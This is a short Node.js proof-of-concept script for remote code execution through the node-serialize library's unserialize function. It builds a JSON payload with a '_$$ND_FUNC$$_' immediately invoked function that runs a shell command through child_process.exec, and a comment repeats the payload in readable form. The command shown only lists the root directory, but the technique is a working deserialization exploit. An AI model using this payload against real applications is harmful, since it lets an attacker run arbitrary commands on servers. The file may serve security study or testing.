var serialize = require('node-serialize');


// rce : function(){
//     require('child_process').exec('ls /', function(error,
//     stdout, stderr) { console.log(stdout) });
//     }(),


var data = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'ls /\',function(error, stdout, stderr) { console.log(stdout)});}()"}';
console.log("Serialized: \n" + serialize.unserialize(data));